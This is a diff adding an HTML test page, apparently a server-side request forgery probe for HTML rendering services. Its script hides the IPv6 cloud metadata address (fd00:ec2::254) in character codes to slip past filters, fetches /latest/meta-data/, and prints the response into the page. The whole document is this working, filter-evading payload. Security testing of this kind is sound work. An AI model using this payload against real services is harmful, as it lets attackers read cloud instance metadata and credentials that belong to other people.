@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>Full CharCode</title></head>
+<body>
+<h1>FULL_CHARCODE_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+// "fd00:ec2::254" from char codes
+var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
+var proto = String.fromCharCode(104,116,116,112);
+var url = proto + "://[" + ip + "]/latest/meta-data/";
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', url, false);
+  xhr.send();
+  document.getElementById('r1').innerText = 'STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,2000);
+} catch(e) {
+  document.getElementById('r1').innerText = 'ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body>
+</html>
